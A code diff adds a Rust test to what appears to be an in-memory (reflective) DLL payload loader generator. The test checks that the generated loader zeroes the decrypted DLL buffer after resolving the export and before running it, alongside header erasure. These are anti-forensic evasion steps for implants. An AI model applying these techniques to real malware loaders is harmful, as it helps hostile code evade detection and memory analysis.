@@ -144,6 +144,44 @@ fn erase_header_zeroes_the_mapped_header_before_the_entry_point() {
     );
 }
 
+/// The decrypted buffer holds the only pristine DLL: the export may block for
+/// its whole lifetime, so the loader zeroes the buffer once the export address
+/// is resolved and before the export runs. Everything that reads `nt` from the
+/// buffer (TLS callbacks, `DllMain`, header erasure, the export lookup) runs
+/// first, and `resolve_export` returns an address in the mapped image, not the
+/// buffer.
+#[test]
+fn the_export_path_zeroes_the_decrypted_payload_after_the_lookup() {
+    let strings = StringsConfig::from_yaml(None).expect("default strings");
+    let fragment = Params::default().render_fragment(&strings);
+
+    let resolve = fragment
+        .find("let address = resolve_export(image_base, nt, name)?;")
+        .expect("the export path must resolve the export");
+    let zero = fragment
+        .find("payload.fill(0);")
+        .expect("the export path must zero the decrypted payload");
+    let call = fragment
+        .find("call_export(address);")
+        .expect("the export path must call the export");
+
+    assert!(
+        resolve < zero && zero < call,
+        "the buffer must be zeroed after the export lookup and before the export runs"
+    );
+    assert_eq!(
+        fragment.matches("payload.fill(0);").count(),
+        1,
+        "nothing may zero the buffer before the steps that read its headers"
+    );
+    assert!(
+        fragment
+            .replace("\r\n", "\n")
+            .contains("payload: &mut [u8],"),
+        "run_reflective must take the buffer mutably so it can be zeroed"
+    );
+}
+
 /// A shellcode payload has no mapped image, so enabling the option changes
 /// nothing in its fragment.
 #[test]
